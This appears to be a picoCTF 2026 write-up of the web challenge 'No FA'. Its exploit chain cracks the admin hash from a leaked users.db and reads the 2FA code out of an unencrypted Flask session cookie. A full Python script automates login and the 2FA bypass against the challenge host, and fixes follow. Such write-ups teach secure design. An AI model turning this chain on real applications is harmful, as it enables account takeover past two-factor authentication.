# picoCTF 2026 — No FA Writeup

**Category:** Web Exploitation  
**Points:** 200  
**Author:** Darkraicg492  
**Flag:** `picoCTF{************************}`

---

## Challenge Description

> Seems like some data has been leaked! Can you get the flag?

**Target URL:** `http://foggy-cliff.picoctf.net:60312/login`

**Files provided:**

- `app.py` — Flask application source code
- `users.db` — SQLite database (leaked!)

---

## Hints Given

1. What makes 2FA safe?

---

## Source Code Analysis

We were given the full Flask source code (`app.py`). Let's break down the critical parts:

### Flag Logic — Only admin sees the flag

```python
@app.route("/")
def home():
    if 'username' not in session or session['logged'] == 'false':
        flash('Please login to access this page', 'red')
        return redirect(url_for('login'))
    
    flag = "No flag for you!!"
    if session.get('username') == 'admin':
        flag = os.getenv('FLAG')
    
    return render_template("index.html", flag=flag)
```

**Goal is clear:** we must be logged in as `admin`.

### Login Logic — SHA256 password check + 2FA

```python
if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:
    if user['two_fa']:
        otp = str(random.randint(1000, 9999))
        session['otp_secret'] = otp        # ⚠️ OTP stored in SESSION cookie!
        session['otp_timestamp'] = time.time()
        session['username'] = username
        session['logged'] = 'false'
        return redirect(url_for('two_fa'))
```

### 2FA Logic — OTP verification

```python
@app.route('/two_fa', methods=['GET', 'POST'])
def two_fa():
    if request.method == 'POST':
        otp = request.form['otp']
        stored_otp = session['otp_secret']
        timestamp = session.get('otp_timestamp')
        if stored_otp and otp == stored_otp and (time.time() - timestamp) < 120:
            session['logged'] = 'true'
            ...
```

### 🔴 The Vulnerability

The OTP (`otp_secret`) is stored **inside the Flask session cookie**, which is:

- Stored **client-side** in the browser
- Only **signed** (not encrypted) by Flask
- **Base64 + zlib encoded** — trivially decodable!

This means anyone who can read their own cookie can extract the OTP without ever receiving it via email/SMS.

---

## Reconnaissance

### Step 1 — Dump the Leaked Database

We were given `users.db`. Querying it:

```bash
sqlite3 users.db "SELECT username, email, password, two_fa FROM users;"
```

Key result:

|Username|Email|Password Hash|2FA|
|---|---|---|---|
|admin|iamadmin@nfs.com|`c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67`|✅ 1|
|john.doe|john.doe@nfa.com|`599a441...`|❌ 0|
|...|...|...|...|

Admin has **2FA enabled** and a SHA256 password hash.

### Step 2 — Crack Admin's Password Hash

Submitted the hash to **[CrackStation](https://crackstation.net)**:

```
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67
```

**Result:** ✅ `apple@123`

---

## Exploitation

### Step 3 — Understanding Flask Session Cookies

Flask session cookies have this structure:

```
.{base64_zlib_compressed_json}.{timestamp}.{signature}
```

The data is **NOT encrypted** — only signed with HMAC. This means we can **read** the contents freely, we just can't forge a new valid cookie without the secret key.

When admin logs in, Flask stores this in the cookie:

```json
{
  "logged": "false",
  "otp_secret": "3469",
  "otp_timestamp": 1773142271.854,
  "username": "admin"
}
```

The OTP is right there in plain sight!

### Step 4 — Manual Cookie Decode (Proof of Concept)

```python
import base64, zlib, json

cookie = ".eJwty0EKgCAQAMC_7FlC0VzyMyG1ieCqqJ2iv-..."
parts = cookie.split('.')
payload = parts[1]
payload += '=' * (4 - len(payload) % 4)
decoded = base64.urlsafe_b64decode(payload)
decompressed = zlib.decompress(decoded)
print(json.loads(decompressed))
# {'logged': 'false', 'otp_secret': '3469', 'otp_timestamp': ..., 'username': 'admin'}
```

### Step 5 — Full Automated Exploit

We wrote a Python script to automate the entire attack chain:

```python
import requests
import base64
import zlib
import json
import re

URL = "http://foggy-cliff.picoctf.net:60312"
session = requests.Session()

# Step 1: Login as admin
print("[*] Logging in as admin...")
session.post(f"{URL}/login", data={
    "username": "admin",
    "password": "apple@123"
}, allow_redirects=True)

# Step 2: Extract OTP from Flask session cookie
flask_cookie = session.cookies.get('session')
parts = flask_cookie.split('.')
payload = parts[1]
payload += '=' * (4 - len(payload) % 4)
decoded = base64.urlsafe_b64decode(payload)
decompressed = zlib.decompress(decoded)
data = json.loads(decompressed)
otp = data.get('otp_secret')
print(f"[+] OTP extracted from cookie: {otp}")

# Step 3: Submit OTP to bypass 2FA
session.post(f"{URL}/two_fa", data={"otp": otp}, allow_redirects=True)

# Step 4: Get the flag
flag_resp = session.get(f"{URL}/", allow_redirects=True)
flag_match = re.search(r'picoCTF\{[^}]+\}', flag_resp.text)
print(f"[+] FLAG FOUND: {flag_match.group(0)}")
```

### Step 6 — Script Output

```
[*] Logging in as admin...
[*] Login status: 200
[*] Redirected to: http://foggy-cliff.picoctf.net:60312/two_fa
[*] Session cookie: .eJwty0EKgCAQAMC_7FlC0VzyMyG1ieCqqJ2iv-eh...
[+] OTP extracted from cookie: 3469
[*] Submitting OTP: 3469
[*] 2FA status: 200
[*] Redirected to: http://foggy-cliff.picoctf.net:60312/
[*] Home page status: 200
[+] FLAG FOUND: picoCTF{****************************}
```

---

## Attack Chain Summary

```
[1] Analyze app.py → OTP stored in Flask session cookie (client-side!)
        ↓
[2] Dump leaked users.db → find admin SHA256 hash
        ↓
[3] Crack hash on CrackStation → admin:apple@123
        ↓
[4] Login as admin → server generates OTP, stores in session cookie
        ↓
[5] Decode Flask session cookie → extract OTP directly
        ↓
[6] Submit OTP to /two_fa → 2FA bypassed ✅
        ↓
[7] Access / as admin → FLAG retrieved ✅
```

---

## Vulnerability Analysis

### The Core Problem — OTP in Client-Side Session

Flask sessions are stored in the browser cookie. While they are **signed** (preventing tampering), they are **not encrypted**. Storing secrets like OTPs in the session means the user can read them.

```python
# ❌ Vulnerable — OTP readable by client
session['otp_secret'] = otp
```

**Fix:** Store the OTP **server-side** (in a database or server-side cache like Redis), keyed by user ID:

```python
# ✅ Secure — OTP stored server-side
import redis
r = redis.Redis()
r.setex(f"otp:{username}", 120, otp)  # expires in 120 seconds
```

### Additional Issues

|Issue|Risk|Fix|
|---|---|---|
|OTP in client session|Critical|Store OTP server-side|
|No rate limiting on `/two_fa`|High|Limit attempts (3 max)|
|Weak OTP range (1000-9999)|Medium|Use 6-digit OTP (000000-999999)|
|Leaked `users.db` file|Critical|Never expose DB files|
|Weak password (`apple@123`)|Medium|Enforce strong password policy|

---

## What Makes 2FA Actually Safe?

The hint asked _"What makes 2FA safe?"_ — here's the answer:

1. **The OTP must be secret** — never stored where the user can read it
2. **Rate limiting** — prevent brute force (lock after 3 wrong attempts)
3. **Short expiry** — 30-60 seconds, not 120
4. **Server-side storage** — OTP lives in the server, not the cookie
5. **Secure delivery** — sent via SMS/email/authenticator app, not derivable from any client data

---

## Tools Used

|Tool|Purpose|
|---|---|
|SQLite3|Dump leaked users.db|
|CrackStation|Crack SHA256 password hash|
|Python (requests)|Automate login + cookie decode + OTP submission|
|Browser DevTools|Inspect session cookies|

---

## Key Takeaways

- **Flask sessions are NOT encrypted** — never store secrets (OTPs, tokens) in them
- **Leaked database files** give attackers everything they need — password hashes + account details
- **2FA is only as strong as its implementation** — a poorly implemented 2FA is worse than no 2FA (false sense of security)
- **Always store OTPs server-side** with short TTL and rate limiting

---

_Writeup by: obito | picoCTF 2026_
